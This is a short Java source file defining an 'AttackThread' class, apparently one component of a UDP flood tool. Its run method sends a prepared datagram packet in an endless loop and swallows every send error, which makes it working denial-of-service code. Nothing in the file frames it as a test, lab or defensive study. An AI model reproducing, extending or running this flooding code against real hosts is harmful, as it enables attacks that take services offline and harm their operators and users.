import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;

public class AttackThread extends Thread {

    private final DatagramSocket socket;
    private final DatagramPacket datagramPacket;

    public AttackThread(DatagramSocket socket, DatagramPacket datagramPacket) {
        this.socket = socket;
        this.datagramPacket = datagramPacket;
    }

    public void run()
    {
        while (true) {
            try {
                socket.send(datagramPacket);
            } catch (IOException ignored) { }
        }
    }
}
